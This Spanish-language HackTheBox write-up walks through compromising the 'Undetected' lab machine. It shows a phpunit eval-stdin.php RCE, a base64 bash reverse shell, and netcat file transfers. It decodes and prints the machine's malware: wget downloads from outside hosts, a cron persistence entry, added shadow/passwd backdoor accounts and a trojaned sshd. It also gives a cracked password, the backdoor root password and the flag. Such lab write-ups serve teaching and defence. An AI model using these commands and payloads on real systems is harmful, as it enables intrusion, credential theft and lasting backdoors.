---
title: HackTheBox - Undetected
categories: [Linux]
tags: [HackTheBox]
image: undetected.png
img_path: /assets/HTB/Undetected/
---

En este post voy a explicar como resolver la máquina Undetected de [Hack The Box](https://app.hackthebox.com/machines/Undetected), en la cual vamos a estar ganando acceso al sistema mediante un Remote Code Execution, y para la escalada tendremos que analizar un binario haciendo uso de ghidra para descifrar la contraseña de root.

## Escaneo de puertos

```
# nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.11.146
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-13 12:06 -03
Nmap scan report for 10.10.11.146
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey:
|   3072 be6606dd2077ef987f6e734a98a5d8f0 (RSA)
|   256 1fa209727068f458ed1f6c497de21339 (ECDSA)
|_  256 70153994c2cd64cbb23bd13ef60944e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).

# Enumeración
Al ingresar a la página, vemos esto.

<img src="undetected-pagina.png">

Al analizar la página web, vemos que el botón ```Store``` nos redirige a ```http://store.djewelry.htb/``` el cual agregamos a nuestro archivo ```/etc/hosts```.

```
echo "10.10.11.146      djewelry.htb store.djewelry.htb" >> /etc/host
```

Regresamos nuevamente a la página y veremos esto.

<img src="undetected-subdominio.png">

No hay nada interesante, vamos a aplicar fuzzing para enumerar directorios.

```
$ ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://store.djewelry.htb/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://store.djewelry.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 233ms]
css                     [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 228ms]
js                      [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 228ms]
vendor                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 229ms]
fonts                   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 228ms]
```

Al hacer el fuzzing vemos que nos reportó el directorio ```vendor```, en el cual se suelen guardar todas las librerías creadas por terceros, dentro de este directorio hay una carpeta llama ```phpunit``` la cual tiene un archivo que es el ```eval-stdin.php``` y es vulnerable a un ```Remote Code Execution```.

```
$ curl -s -X POST 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system("whoami");'
www-data
```

# Reverse Shell
Como tenemos ejecución remota de comandos, vamos a mandarnos una reverse shell, por lo tanto, nos pondremos en escucha con netcat y tramitaremos la siguiente petición.

```
$ echo -n 'bash -i >& /dev/tcp/10.10.14.3/6969 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzY5NjkgMD4mMQ==
$ curl 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzY5NjkgMD4mMQ== | base64 -d | bash");'
```

```
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.146] 43864
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
# Enumeración del sistema
Si nos dirigimos al directorio ```/home``` veremos un usuario llamado ```steven```.
```
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /home
www-data@production:/home$ ls -l
total 4
drwxr-x--- 5 steven steven 4096 Feb  8  2022 steven
```

Si listamos con el comando ```find``` los archivos cuyo propietario es ```www-data``` veremos uno llamado ```/var/backups/info```

```
www-data@production:/home$ find / -user www-data 2>/dev/null | grep -vE "proc|www"
/dev/pts/1
/dev/pts/0
/var/cache/apache2/mod_cache_disk
/var/backups/info
/run/lock/apache2
```
Los permisos que tenemos puestos sobre este archivo son los de lectura y ejecución, si usamos el comando file en este archivo, veremos que es un binario de 64 bits

```
www-data@production:/home$ ls -l /var/backups/info
-r-x------ 1 www-data www-data 27296 May 14  2021 /var/backups/info
www-data@production:/home$ file /var/backups/info
/var/backups/info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped
```

Vamos a pasar este binario a nuestra máquina con netcat.

```
www-data@production:/var/backups$ cat info | nc 10.10.14.3 8080
www-data@production:/var/backups$ md5sum info
04060ea986c7bacdc64130a1d7b8ca2d  info
```

```
$ nc -lvnp 8080 > info
listening on [any] 8080 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.146] 40886

$ md5sum info
04060ea986c7bacdc64130a1d7b8ca2d  info
```

Si usamos el comando ```strings``` para listar las cadenas de caracteres imprimibles del archivo ```info```, veremos data en hexadecimal, a la cual le podemos aplicar un ```xxd -ps -r``` para ver como estaba antes.

```
$ strings info | grep -A 1 "/bin/bash" | grep -v "bash" | xxd -ps -r
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```

Sí ordenamos la data nos quedaría así

```bash
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys

wget tempfiles.xyz/.main -O /var/lib/.main

chmod 755 /var/lib/.main

echo "* 3 * * * root /var/lib/.main" >> /etc/crontab

awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd

awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd

while read -r user group home shell _; do
  echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd
done < users.txt

rm users.txt
```

Si analizamos estos comandos, vemos que hay un hash el cual puede llegar a ser la contraseña de ```steven```, vamos a intentar ```crackearlo``` mediante un ataque de fuerza bruta con ```john```.

```
$ echo "$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::" > hash
$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (?)
1g 0:00:00:10 DONE (2022-12-13 20:25) 0.09380g/s 8357p/s 8357c/s 8357C/s littlebrat..halo03
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Una vez crackeado vamos a intentar convertirnos en el usuario steven haciendo uso de la contraseña recientemente obtenida.

```
www-data@production:/var/backups$ su steven
Password: ihatehackers
su: Authentication failure
```

Como vemos esta no es la contraseña de steven, si leemos el archivo ```/etc/passwd``` podemos ver que hay otro usuario llamado ```steven1```, probemos la contraseña con ese otro usuario.

```
www-data@production:/var/backups$ su steven1
Password: ihatehackers
steven@production:/var/backups$ id
uid=1000(steven) gid=1000(steven) groups=1000(steven)
```

Al parecer somos el usuario steven, aunque le hayamos indicado steven1, esto se debe porque ambos usuarios tiene el mismo UID.

Vamos a enumerar nuevamente por archivos cuyo propietario sea steven

```
steven@production:/var/backups$ find / -user steven 2>/dev/null | grep -vE 'sys|run|proc'
/dev/pts/7
/var/mail/steven
/home/steven
/home/steven/.cache
/home/steven/.cache/motd.legal-displayed
/home/steven/.bashrc
/home/steven/.profile
/home/steven/.local
/home/steven/.local/share
/home/steven/.local/share/nano
/home/steven/.ssh
/home/steven/.bash_logout
/home/steven/.bash_history
```

Como vemos, este usuario tiene un correo en ```/var/mail/steven```

```
steven@production:/var/backups$ cat /var/mail/steven
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```

Para resumir, lo que dice el correo es que en el servicio de apache hay cosas raras, así que vamos a buscar por archivos que hace poco hayan sido modificados del apache

```
steven@production:/var/backups$ find / -name apache2 2>/dev/null
/usr/lib/apache2
steven@production:/var/backups$ ls /usr/lib/apache2
modules
steven@production:/usr/lib/apache2$ cd modules
steven@production:/usr/lib/apache2/modules$ stat * | grep "Modify" | sort -u
Modify: 2021-05-17 07:10:04.000000000 +0000
Modify: 2021-11-25 23:16:22.000000000 +0000
Modify: 2022-01-05 14:49:56.000000000 +0000
steven@production:/usr/lib/apache2/modules$ stat * | grep "2021-05-17" -B 5
  File: mod_reader.so
  Size: 34800           Blocks: 72         IO Block: 4096   regular file
Device: fd00h/64768d    Inode: 2050        Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2022-12-13 14:58:11.599681740 +0000
Modify: 2021-05-17 07:10:04.000000000 +0000
```

Filtrando por fechas de los archivos que últimamente fueron modificados, dimos con el archivo ```mod_reader.so```, vamos a pasarlo a nuestra máquina para inspeccionarlo.

```
steven@production:/usr/lib/apache2/modules$ cat mod_reader.so | nc 10.10.14.3 8080
steven@production:/usr/lib/apache2/modules$ md5sum mod_reader.so
5ef63371b6a138253a87aa1f79abf199  mod_reader.so
```
```
$ nc -lvnp 8080 > mod_reader.so
listening on [any] 8080 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.146] 43450
$ md5sum mod_reader.so
5ef63371b6a138253a87aa1f79abf199  mod_reader.so
```

Si le aplicamos un strings al archivo ```mod_reader.so```, veremos que hay una cadena de texto larga, la cual parece ser ```base64```.

```
$ strings mod_reader.so | grep "/bin/bash" -A 2 | tail -n 1
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk

$ strings mod_reader.so | grep "/bin/bash" -A 2 | tail -n 1 | base64 -d
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d date +%Y-%m-%d -r /usr/sbin/a2enmod /usr/sbin/sshd
```

Al decodificarlo vemos que es un one-liner de dos comandos.

```bash
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd
touch -d date +%Y-%m-%d -r /usr/sbin/a2enmod /usr/sbin/sshd
```

Lo que hace es que descarga una supuesta imagen, con ella sobrescribe /usr/sbin/sshd y luego le cambia la fecha, vamos a traernos a nuestra máquina el archivo ```/usr/sbin/sshd```.

```
steven@production:/usr/sbin$ cat sshd | nc 10.10.14.3 8080
steven@production:/usr/sbin$ md5sum sshd
9ae629656c6f72dc957358b1f41df27e  sshd
```

```
$ nc -lvnp 8080 > sshd
listening on [any] 8080 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.146] 43806
$ md5sum sshd
9ae629656c6f72dc957358b1f41df27e  sshd
```

Si analizamos el archivo con ghidra, veremos que hay una función llamada ```auth_password```, la cual es bastante sospechosa porque hay una variable llamada ```backdoor```.

```
int auth_password(sshssh,char password)

{
  Authctxtctxt;
  passwd ppVar1;
  int iVar2;
  uint uVar3;
  bytepbVar4;
  byte pbVar5;
  size_t sVar6;
  byte bVar7;
  int iVar8;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long local_30;

  bVar7 = 0xd6;
  ctxt = (Authctxt)ssh->authctxt;
  local_30 = (long)(in_FS_OFFSET + 0x28);
  backdoor._282 = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar8 = ctxt->valid;
  backdoor._244 = 0xbcf0b5e3;
  backdoor._168 = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = '\xa5';
  backdoor._04 = 0xf0e7abd6;
  backdoor._44 = 0xa4b3a3f3;
  backdoor._84 = 0xf7bbfdc8;
  backdoor._124 = 0xfdb3d6e7;
  pbVar4 = (byte *)backdoor;
  while( true ) {
    pbVar5 = pbVar4 + 1;
    pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 =pbVar5;
    pbVar4 = pbVar5;
  }
  iVar2 = strcmp(password,backdoor);
  uVar3 = 1;
  if (iVar2 != 0) {
    sVar6 = strlen(password);
    uVar3 = 0;
    if (sVar6 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar8 = 0;
      }
      if ((password != '\0') ||
         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        uVar3 = (uint)(iVar2 != 0 && iVar8 != 0);
      }
    }
  }
  if (local_30 ==(long )(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    / WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

# Escalada de privilegios

Si analizamos la función podemos deducir que la contraseña es una strings de 31 caracteres, la cual está en hexadecimal, si la organizamos nos quedaría así.

```
$ cat data

backdoor[30] = '0xa5';
backdoor._282 = 0xa9f4;
backdoor._244 = 0xbcf0b5e3;
backdoor._168 = 0xb2d6f4a0fda0b3d6;
backdoor._124 = 0xfdb3d6e7;
backdoor._84 = 0xf7bbfdc8;
backdoor._44 = 0xa4b3a3f3;
backdoor._04 = 0xf0e7abd6;
$ cat data | awk 'NF{print $NF}' | tr -d "'" | tr -d ";"
0xa5
0xa9f4
0xbcf0b5e3
0xb2d6f4a0fda0b3d6
0xfdb3d6e7
0xf7bbfdc8
0xa4b3a3f3
0xf0e7abd6
```

<img src="cyberchef.png">

Intentemos ingresar por SSH como el usuario root utilizando la contraseña que obtuvimos.

```
$ ssh root@10.10.11.146
root@10.10.11.146's password: @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3   
root@production:~# cat root.txt
22bb0cc00f75bb4df6acae8a15666953
```
